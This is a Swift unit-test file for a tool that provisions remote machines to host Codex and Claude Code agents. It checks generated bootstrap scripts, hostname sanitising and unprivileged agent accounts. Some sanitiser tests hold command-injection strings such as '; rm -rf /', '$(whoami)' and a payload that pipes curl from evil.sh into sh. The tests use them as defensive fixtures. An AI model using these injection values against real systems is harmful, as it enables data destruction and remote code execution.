import XCTest
@testable import CodexRemoteKit

/// The bootstrap scripts are generated text that only ever runs on a remote host, where a
/// syntax error costs a whole provision. These tests run `bash -n` over every stage so a
/// broken quote is caught here instead of three minutes into a real server.
final class BootstrapScriptTests: XCTestCase {
    private let plan = BootstrapPlan(
        workspacePath: "/root/workspace",
        remotePort: 1456,
        codexVersion: "0.157.0",
        extraPackages: ["golang-go", "postgresql-client"],
        postSetupScript: "git clone https://example.com/repo.git\necho done",
        idleShutdownMinutes: 60
    )

    private func assertValidShell(_ script: String, _ label: String,
                                  file: StaticString = #filePath, line: UInt = #line) throws {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("codex-remote-\(label)-\(UUID().uuidString).sh")
        defer { try? FileManager.default.removeItem(at: url) }
        try script.write(to: url, atomically: true, encoding: .utf8)

        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/bash")
        process.arguments = ["-n", url.path]
        let pipe = Pipe()
        process.standardError = pipe
        try process.run()
        process.waitUntilExit()
        let message = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        XCTAssertEqual(process.terminationStatus, 0,
                       "\(label) is not valid bash:\n\(message)", file: file, line: line)
    }

    func testEveryStageIsValidBash() throws {
        try assertValidShell(BootstrapScript.basePackages(plan), "base")
        try assertValidShell(BootstrapScript.installCodex(plan), "codex")
        try assertValidShell(BootstrapScript.installService(plan), "service")
        try assertValidShell(XCTUnwrap(BootstrapScript.postSetup(plan)), "post-setup")
        try assertValidShell(BootstrapScript.uninstall(), "uninstall")
    }

    func testServiceStageIsValidBashWithoutIdleShutdown() throws {
        var noIdle = plan
        noIdle = BootstrapPlan(workspacePath: plan.workspacePath, remotePort: plan.remotePort,
                               idleShutdownMinutes: 0)
        try assertValidShell(BootstrapScript.installService(noIdle), "service-no-idle")
        XCTAssertFalse(BootstrapScript.installService(noIdle).contains("codex-remote-idle.timer"))
    }

    func testHeredocTerminatorsAreAtColumnZero() {
        // `<<'EOF'` (not `<<-`) requires the terminator to start at column 0; Swift's
        // multiline-string indentation stripping is what makes that true, so pin it.
        for line in BootstrapScript.installService(plan).split(separator: "\n", omittingEmptySubsequences: false)
        where line.contains("CODEX_REMOTE_") && !line.contains("<<") {
            XCTAssertFalse(line.hasPrefix(" "), "heredoc terminator is indented: \(line)")
        }
    }

    func testServiceUnitPointsAtTheLoopbackListenerWithTokenAuth() {
        let script = BootstrapScript.installService(plan)
        XCTAssertTrue(script.contains("--listen ws://127.0.0.1:1456"))
        XCTAssertTrue(script.contains("--ws-auth capability-token"))
        XCTAssertTrue(script.contains("--ws-token-file /etc/codex-remote/appserver.token"))
        XCTAssertTrue(script.contains("Restart=always"))
    }

    func testCodexStageHonoursAPinnedVersion() {
        XCTAssertTrue(BootstrapScript.installCodex(plan).contains("@openai/codex@0.157.0"))
        let unpinned = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456)
        XCTAssertTrue(BootstrapScript.installCodex(unpinned).contains("@openai/codex@latest"))
    }

    /// Extra packages come from a free-text field, so they must not be able to become
    /// a second command in the apt line.
    func testExtraPackagesAreFilteredToPackageNames() {
        let hostile = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                    extraPackages: ["golang-go", "; rm -rf /", "$(whoami)", "a&&b"])
        let script = BootstrapScript.basePackages(hostile)
        XCTAssertTrue(script.contains("golang-go"))
        XCTAssertFalse(script.contains("rm -rf /"))
        XCTAssertFalse(script.contains("$(whoami)"))
        XCTAssertFalse(script.contains("a&&b"))
    }

    func testWorkspacePathReachesEveryStageThatNeedsIt() {
        let plan = BootstrapPlan(workspacePath: "/srv/agent", remotePort: 9999)
        XCTAssertTrue(BootstrapScript.basePackages(plan).contains("/srv/agent"))
        XCTAssertTrue(BootstrapScript.installService(plan).contains("WorkingDirectory=/srv/agent"))
    }

    func testCloudInitIsValidYAMLHeader() {
        XCTAssertTrue(BootstrapScript.cloudInit().hasPrefix("#cloud-config"))
    }
}

/// The name the user types has to be the name everything else shows: the machine's own
/// hostname, the Codex app's entry, and the Claude session.
final class MachineNamingTests: XCTestCase {
    func testTheHostnameIsSetFromTheMachineName() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 hostname: "codex-eu")
        let script = BootstrapScript.basePackages(plan)
        XCTAssertTrue(script.contains("hostnamectl set-hostname 'codex-eu'"))
        XCTAssertTrue(script.contains("/etc/hosts"))
    }

    /// A machine name is free text and it lands in a shell command, so the sanitiser is
    /// what has to hold. Asserting against the whole script would be a weaker test and a
    /// misleading one — the script legitimately contains `rm -rf /etc/codex-remote` and `$(seq …)`.
    func testHostileNamesAreReducedToHarmlessHostnames() {
        let hostiles = [
            "a; rm -rf /",
            "$(whoami)",
            "`id`",
            "a b|c",
            "../../etc",
            "x' ; curl evil.sh | sh ; '",
        ]
        for hostile in hostiles {
            let safe = BootstrapScript.shellSafe(hostile)

            // Single-quoted, and containing nothing that could end the quoting or start a
            // command: no quotes, no $, no backticks, no pipes, no semicolons, no slashes.
            XCTAssertTrue(safe.hasPrefix("'") && safe.hasSuffix("'"), safe)
            let inner = safe.dropFirst().dropLast()
            XCTAssertTrue(inner.allSatisfy { $0.isLowercase || $0.isNumber || $0 == "-" },
                          "\(hostile) produced \(safe)")

            // And the dangerous fragment is genuinely gone from the emitted line.
            let script = BootstrapScript.basePackages(
                BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456, hostname: hostile))
            let hostnameLine = script.split(separator: "\n")
                .first { $0.contains("hostnamectl set-hostname") } ?? ""
            XCTAssertEqual(String(hostnameLine).trimmingCharacters(in: .whitespaces),
                           "hostnamectl set-hostname \(safe) 2>/dev/null || true")
        }
    }

    func testNamesAreReducedToSomethingAHostnameMayContain() {
        XCTAssertEqual(BootstrapScript.shellSafe("Codex EU"), "'codex-eu'")
        XCTAssertEqual(BootstrapScript.shellSafe("build/box_1"), "'build-box-1'")
        XCTAssertEqual(BootstrapScript.shellSafe("---"), "'codex-remote'")
        XCTAssertEqual(BootstrapScript.shellSafe(""), "'codex-remote'")
        // Hostnames are capped at 63 characters per label.
        XCTAssertLessThanOrEqual(BootstrapScript.shellSafe(String(repeating: "a", count: 200)).count, 65)
    }

    func testTheClaudeSessionIsNamedAfterTheMachineNotItsSSHAlias() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 hostname: "codex-eu")
        let script = BootstrapScript.installClaudeService(plan, sessionName: "codex-eu")
        XCTAssertTrue(script.contains("remote-control --name codex-eu"))
        XCTAssertFalse(script.contains("--name codex-remote-codex-eu"),
                       "the user named it codex-eu, so that is what Claude should show")
    }
}

/// Providers gain new OS releases; a hardcoded default silently becomes the old one.
final class ImageSelectionTests: XCTestCase {
    func testTheNewestUbuntuWins() {
        let images = [
            OSImage(slug: "ubuntu-22.04", name: "Ubuntu 22.04", family: "ubuntu"),
            OSImage(slug: "ubuntu-26.04", name: "Ubuntu 26.04", family: "ubuntu"),
            OSImage(slug: "ubuntu-24.04", name: "Ubuntu 24.04", family: "ubuntu"),
            OSImage(slug: "debian-12", name: "Debian 12", family: "debian"),
        ]
        XCTAssertEqual(ProviderCapabilities.newestUbuntu(in: images)?.slug, "ubuntu-26.04")
    }

    /// Every cloud spells it differently.
    func testVersionIsParsedFromEachCloudsSlugShape() {
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "ubuntu-26.04", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "ubuntu-26-04-x64", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "linode/ubuntu26.04", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "", name: "Ubuntu 26.04 x64", family: "ubuntu")).0, 26)
    }

    func testNoUbuntuMeansNoGuess() {
        XCTAssertNil(ProviderCapabilities.newestUbuntu(
            in: [OSImage(slug: "debian-12", name: "Debian 12", family: "debian")]))
    }

    /// Every module's built-in list must offer Ubuntu 26 by default.
    func testEveryModuleDefaultsToUbuntu26() {
        for module in TofuRegistration.modules {
            let capabilities = module.fallbackCapabilities()
            guard let recommended = capabilities.images.first(where: {
                $0.slug == capabilities.recommendedImage
            }) else {
                // AWS resolves its AMI at apply time from an empty slug.
                XCTAssertEqual(capabilities.recommendedImage, "", module.displayName)
                continue
            }
            XCTAssertEqual(ProviderCapabilities.ubuntuVersion(of: recommended).0, 26,
                           "\(module.displayName) still defaults to an older Ubuntu")
        }
    }
}

/// An SSH session stays open until every process holding its stdout or stderr exits, so a
/// backgrounded job that inherits them hangs the client — a ten-minute `sleep` once held a
/// sign-in command open until it was killed. Everything Codex Remote backgrounds on a machine has
/// to close all three descriptors.
final class DetachedCommandTests: XCTestCase {
    func testDetachedCommandsCloseEveryDescriptor() {
        let detached = SSHClient.detached("sleep 900")
        XCTAssertTrue(detached.contains("</dev/null"), detached)
        XCTAssertTrue(detached.contains(">/dev/null"), detached)
        XCTAssertTrue(detached.contains("2>&1"), detached)
        XCTAssertTrue(detached.contains("setsid"), "it must leave the session's process group")
        XCTAssertTrue(detached.hasSuffix("&"))
    }

    /// The command becomes one single-quoted argument, so the real test is that a shell
    /// unquotes it back to exactly what went in.
    func testTheCommandSurvivesQuotingExactly() throws {
        let original = "echo 'already quoted' && rm -rf /tmp/x"
        let detached = SSHClient.detached(original)
        XCTAssertTrue(detached.contains("bash -c '"))
        // POSIX single-quote escaping: a quote is closed, escaped and reopened.
        XCTAssertTrue(detached.contains("'\\''"), detached)

        // Hand it to a real shell and check what bash -c would have received.
        let quoted = SSHClient.singleQuoted(original)
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/bash")
        process.arguments = ["-c", "printf '%s' \(quoted)"]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        process.waitUntilExit()
        let roundTripped = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(),
                                  as: UTF8.self)
        XCTAssertEqual(roundTripped, original, "quoting must be lossless and inert")
    }

    /// Every background job in a generated script has to be a detached one.
    func testNoBootstrapScriptBackgroundsAJobWithoutRedirecting() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 idleShutdownMinutes: 30, hostname: "box")
        let scripts: [(String, String)] = [
            ("base", BootstrapScript.basePackages(plan)),
            ("codex", BootstrapScript.installCodex(plan)),
            ("claude", BootstrapScript.installClaudeCode(plan)),
            ("codex service", BootstrapScript.installService(plan)),
            ("claude service", BootstrapScript.installClaudeService(plan, sessionName: "box")),
            ("uninstall", BootstrapScript.uninstall()),
        ]
        for (name, script) in scripts {
            for line in script.split(separator: "\n") {
                let trimmed = line.trimmingCharacters(in: .whitespaces)
                guard trimmed.hasSuffix("&"), !trimmed.hasSuffix("&&") else { continue }
                XCTAssertTrue(trimmed.contains(">/dev/null") || trimmed.contains("setsid"),
                              "\(name) backgrounds a job without closing its descriptors: \(trimmed)")
            }
        }
    }
}

/// Claude Code runs under its own unprivileged account. Root refuses its most permissive
/// mode, and an agent with a whole machine to itself has no reason to be root.
final class ClaudeAccountTests: XCTestCase {
    private let plan = BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456,
                                     hostname: "box")

    func testTheAccountIsCreatedAndOwnsItsOwnInstall() {
        let script = BootstrapScript.installClaudeCode(plan)
        XCTAssertTrue(script.contains("useradd --create-home --shell /bin/bash claude"))
        XCTAssertTrue(script.contains("su - claude -c 'curl -fsSL https://claude.ai/install.sh | bash'"),
                      "the install must run as the account that will use it")
        XCTAssertTrue(script.contains("passwd -l claude"), "no password login for the agent account")
    }

    func testTheServiceRunsAsTheAccountNotRoot() {
        let script = BootstrapScript.installClaudeService(plan, sessionName: "box")
        XCTAssertTrue(script.contains("User=claude"))
        XCTAssertTrue(script.contains("Group=claude"))
        XCTAssertTrue(script.contains("Environment=HOME=/home/claude"))
        XCTAssertFalse(script.contains("User=root"), "the whole point is that it is not root")
    }

    /// `/root` is mode 700, so an unprivileged account cannot traverse into it. A machine
    /// built before the account existed has exactly that workspace, and must not get a
    /// service that cannot reach its own working directory.
    func testAWorkspaceUnderRootIsReplacedForTheAgentAccount() {
        let legacy = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456)
        XCTAssertEqual(legacy.claudeWorkspace, "/home/claude/workspace")

        let shared = BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456)
        XCTAssertEqual(shared.claudeWorkspace, "/srv/workspace",
                       "a reachable workspace is shared, not duplicated")

        let script = BootstrapScript.installClaudeService(legacy, sessionName: "box")
        XCTAssertTrue(script.contains("WorkingDirectory=/home/claude/workspace"))
    }

    func testTheSharedWorkspaceIsWritableByBothAgents() {
        let script = BootstrapScript.installClaudeCode(plan)
        XCTAssertTrue(script.contains("chown -R claude:claude '/srv/workspace'"))
        // setgid keeps anything created inside group-writable, so root and claude can both
        // work in the same tree.
        XCTAssertTrue(script.contains("chmod 2775 '/srv/workspace'"))
    }

    func testTheDefaultWorkspaceIsNotUnderRoot() {
        XCTAssertFalse(MachineSpec.defaultWorkspacePath.hasPrefix("/root"),
                       "an unprivileged agent could never reach it there")
    }
}

extension ClaudeAccountTests {
    /// A machine authorised before the agent account existed keeps its login: moving it is
    /// the same credential on the same machine, and avoids a needless second browser
    /// approval. It moves rather than copies, so root's copy stops being usable.
    func testAnExistingRootLoginIsMovedToTheAccount() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertTrue(script.contains("mv /root/.claude/.credentials.json /home/claude/.claude/.credentials.json"))
        XCTAssertTrue(script.contains("chmod 600 /home/claude/.claude/.credentials.json"))
        XCTAssertFalse(script.contains("cp /root/.claude/.credentials.json"),
                       "two copies of one credential is the problem, not the fix")
    }
}

extension ClaudeAccountTests {
    /// `install /dev/stdin` fails with ENOENT once the destination exists, so it broke
    /// every repair after the first. The drop-in is also validated before it goes into
    /// place: an unparseable sudoers file takes sudo down for root too.
    func testTheSudoersDropInIsWrittenSafelyAndValidatedBeforeItLands() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertFalse(script.contains("install -m 0440 /dev/stdin"),
                       "install /dev/stdin is not idempotent — repairs fail on it")
        let staged = "/etc/sudoers.d/.90-codex-remote-claude.new"
        XCTAssertTrue(script.contains("cat > \(staged)"))
        guard let validate = script.range(of: "visudo -cf \(staged)"),
              let move = script.range(of: "mv \(staged) /etc/sudoers.d/90-codex-remote-claude")
        else { return XCTFail("expected the drop-in to be validated, then moved into place") }
        XCTAssertTrue(validate.lowerBound < move.lowerBound, "validate before it lands")
    }
}

extension ClaudeAccountTests {
    /// `claude --remote-control <name>` starts ONE session: it shows in Recents but leaves
    /// the Remote Control menu empty, so you cannot start a new project on the machine.
    /// `claude remote-control` is the host side that registers the machine itself.
    func testTheServiceRunsTheHostDaemonNotASingleSession() {
        let unit = BootstrapScript.installClaudeService(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456),
            sessionName: "demo-box")
        XCTAssertTrue(unit.contains("/usr/local/bin/claude remote-control --name demo-box"))
        XCTAssertFalse(unit.contains("claude --remote-control demo-box"),
                       "that form only ever registers one session, never the machine")
    }

    /// The host daemon asks "Enable Remote Control? (y/n)" on first run and blocks forever
    /// under systemd waiting for an answer nobody is there to give.
    func testTheEnableRemoteControlPromptIsPreAnswered() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertTrue(script.contains("data[\"remoteDialogSeen\"] = True"))
    }
}
